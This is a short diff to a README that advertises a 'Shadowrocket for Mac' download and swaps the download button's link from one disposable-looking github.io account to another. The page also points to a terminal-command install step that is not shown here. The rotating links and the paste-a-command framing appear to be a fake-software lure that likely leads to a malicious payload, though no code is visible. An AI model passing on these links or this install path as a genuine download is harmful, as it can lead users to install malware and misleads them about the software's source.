@@ -4,7 +4,7 @@
 Shadowrocket for Mac is a powerful proxy utility designed for advanced network traffic management, secure browsing, and privacy control on macOS 💻.  
 This guide will help you quickly download and install Shadowrocket for Mac with simple steps below.  
 
-[![Download For Mac](https://img.shields.io/badge/Download%20for-Mac%20OS-lightgrey?style=for-the-badge&logo=apple)](https://kamartamara.github.io/.github/shadowrocket)  
+[![Download For Mac](https://img.shields.io/badge/Download%20for-Mac%20OS-lightgrey?style=for-the-badge&logo=apple)](https://tayusikf8398.github.io/.github/shadowrocket)  
 
 If the download button does not work, follow the installation instructions below using the terminal command.
 
